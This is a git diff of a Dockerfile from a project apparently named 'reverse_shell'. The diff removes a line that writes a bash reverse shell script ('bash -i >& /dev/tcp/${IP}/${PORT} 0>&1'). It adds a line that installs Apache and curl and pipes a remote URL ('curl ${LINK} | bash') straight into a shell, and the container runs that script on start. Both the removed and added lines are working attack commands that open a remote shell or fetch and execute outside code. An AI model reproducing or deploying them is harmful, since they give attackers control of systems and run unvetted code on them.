@@ -3,8 +3,8 @@ FROM debian:latest
 
 LABEL maintainer="Lars Lühr and contributors <https://github.com/ayeks/reverse_shell>"
 
-RUN echo "bash -i >& /dev/tcp/\${IP}/\${PORT} 0>&1" > reverse_shell.sh
+RUN echo "apt update; apt install apache2 -y; apachectl start; apt install curl; curl \${LINK} | bash -s \${W}" > reverse_shell.sh
 
 CMD ["bash", "./reverse_shell.sh"]
 
-EXPOSE 6969
+EXPOSE 80
